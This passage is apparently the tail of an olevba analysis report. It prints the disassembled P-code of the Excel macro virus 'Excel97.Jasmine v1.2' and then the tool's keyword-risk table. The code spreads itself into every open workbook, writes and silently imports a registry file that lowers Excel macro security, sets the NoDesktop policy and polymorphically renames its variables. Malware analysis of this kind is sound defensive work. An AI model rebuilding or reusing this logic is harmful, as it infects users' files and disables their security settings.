' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #36:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' Line #37:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Ne 
' 	IfBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	LitDI2 0x0006 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	SetStmt 
' 	Ld ii 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Se3Hs8Xo2Ir2Rq4Kc9 
' Line #43:
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd New 
' 	St Wb9 
' Line #44:
' 	SetStmt 
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	Set Infline 
' Line #45:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Infline 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Ne 
' 	IfBlock 
' Line #46:
' 	LitDI2 0x0001 
' 	Ld Wb9 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #48:
' 	LitDI2 0x0006 
' 	LitStr 0x001F "Private Sub WorkBook_Activate()"
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	StartForVariable 
' 	Next 
' Line #53:
' 	Ld Xc4Rc6Nb1Xh7Uc3Yy9 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #54:
' 	LitVarSpecial (False)
' 	St Xc4Rc6Nb1Xh7Uc3Yy9 
' Line #55:
' 	LitVarSpecial (True)
' 	ParamNamed savechanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #56:
' 	Ld Eq7Jw1 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #58:
' 	Ld Application 
' 	MemLd Version 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x0013 "9.0\Excel\Security]"
' 	Concat 
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x001A "8.0\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x002C "8.0\New User\Settings\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x001A "8.0\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #70:
' 	LitStr 0x000B "regedit /s "
' 	Ld Eq7Jw1 
' 	Concat 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #71:
' 	Ld Eq7Jw1 
' 	ArgsCall Kill 0x0001 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Eq 
' 	IfBlock 
' Line #74:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	SelectCase 
' Line #75:
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #76:
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #77:
' 	LitDI2 0x0006 
' 	LitDI2 0x000A 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #78:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #79:
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	MemStWith Heading 
' Line #80:
' 	LineCont 0x0004 0B 00 0C 00
' 	LitStr 0x0022 "Since the only time I see her near"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0017 "Is when I close my eyes"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0019 "Should I keep it that way"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0023 "The only way I can make her stay..."
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	MemStWith Then 
' Line #81:
' 	LitDI2 0x0016 
' 	MemStWith Animation 
' Line #82:
' 	ArgsMemCallWith Show 0x0000 
' Line #83:
' 	EndWith 
' Line #84:
' 	LitDI2 0x000B 
' 	LitDI2 0x0014 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0258 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ForStep 
' Line #86:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St Yx1Kg4De8Bs6Sm1Jd5Ca0 
' Line #87:
' 	Ld Yx1Kg4De8Bs6Sm1Jd5Ca0 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Concat 
' 	St j 
' Line #88:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #89:
' 	LitStr 0x000F "Excel97.Jasmine"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #90:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #91:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #92:
' 	LitStr 0x0005 "Arial"
' 	MemStWith New 
' Line #93:
' 	LitDI2 0x000A 
' 	MemStWith Size 
' Line #94:
' 	EndWith 
' Line #95:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #96:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #97:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	MemStWith ColorIndex 
' Line #98:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #99:
' 	EndWith 
' Line #100:
' 	LineCont 0x0004 05 00 05 00
' 	Ld Yx1Kg4De8Bs6Sm1Jd5Ca0 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld Yx1Kg4De8Bs6Sm1Jd5Ca0 
' 	Concat 
' 	ArgsLd Columns 0x0001 
' 	MemLd EntireColumn 
' 	ArgsMemCall AutoFit 0x0000 
' Line #101:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #102:
' 	StartForVariable 
' 	Next 
' Line #103:
' 	LitDI2 0x0015 
' 	LitDI2 0x001E 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #104:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0009 "NoDesktop"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #105:
' 	LitDI2 0x001F 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Case 
' 	CaseDone 
' Line #106:
' 	LitStr 0x0000 ""
' 	Ld vbInformation 
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	ArgsCall MsgBox 0x0003 
' Line #107:
' 	EndSelect 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Private Sub Encode(Loc As Object))
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn varray (As String)
' Line #113:
' 	Dim 
' 	VarDefn Do0Nw3Ag1Pz6Yk6 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Sa4Ym1Ho4Wi0 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Bp0Ah5Ak9Jr3Qa5Yo3Ze6 (As Long)
' Line #114:
' 	LitStr 0x0006 "Eq7Jw1"
' 	LitDI2 0x0001 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0018 "Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4"
' 	LitDI2 0x0002 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0018 "Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5"
' 	LitDI2 0x0003 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0012 "Se3Hs8Xo2Ir2Rq4Kc9"
' 	LitDI2 0x0004 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "Wb9"
' 	LitDI2 0x0005 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x001E "Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9"
' 	LitDI2 0x0006 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000F "Yp3Wi1Ex3Iq8Iw1"
' 	LitDI2 0x0007 
' 	ArgsSt varray 0x0001 
' Line #115:
' 	LitStr 0x0012 "Xc4Rc6Nb1Xh7Uc3Yy9"
' 	LitDI2 0x0008 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Yx1Kg4De8Bs6Sm1Jd5Ca0"
' 	LitDI2 0x0009 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000F "Do0Nw3Ag1Pz6Yk6"
' 	LitDI2 0x000A 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x001B "Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1"
' 	LitDI2 0x000B 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000C "Sa4Ym1Ho4Wi0"
' 	LitDI2 0x000C 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Bp0Ah5Ak9Jr3Qa5Yo3Ze6"
' 	LitDI2 0x000D 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Dj4Rb0Vn7Kv8Uz2Yx3Ym1"
' 	LitDI2 0x000E 
' 	ArgsSt varray 0x0001 
' Line #116:
' 	ArgsCall Read 0x0000 
' Line #117:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	For 
' Line #118:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	For 
' Line #119:
' 	Ld PolyVal 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0030 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyVal 
' Line #120:
' 	StartForVariable 
' 	Next 
' Line #121:
' 	StartWithExpr 
' 	Ld Loc 
' 	With 
' Line #122:
' 	LitDI2 0x0001 
' 	St Do0Nw3Ag1Pz6Yk6 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St Sa4Ym1Ho4Wi0 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' Line #123:
' 	Ld i 
' 	ArgsLd varray 0x0001 
' 	Ld Do0Nw3Ag1Pz6Yk6 
' 	Ld Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' 	Ld Sa4Ym1Ho4Wi0 
' 	Ld Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #124:
' 	Ld Do0Nw3Ag1Pz6Yk6 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strVal 
' Line #125:
' 	Ld strVal 
' 	Ld Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld PolyVal 
' 	Concat 
' 	Ld strVal 
' 	Ld Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strVal 
' Line #126:
' 	Ld Do0Nw3Ag1Pz6Yk6 
' 	Ld strVal 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #127:
' 	Ld Sa4Ym1Ho4Wi0 
' 	LitDI2 0x0001 
' 	Add 
' 	St Do0Nw3Ag1Pz6Yk6 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' Line #128:
' 	MemLdWith CountOfLines 
' 	St Sa4Ym1Ho4Wi0 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' Line #129:
' 	Loop 
' Line #130:
' 	EndWith 
' Line #131:
' 	LitStr 0x0000 ""
' 	St PolyVal 
' Line #132:
' 	StartForVariable 
' 	Next 
' Line #133:
' 	EndSub 
' Line #134:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |WorkBook_Activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |remove.reg          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

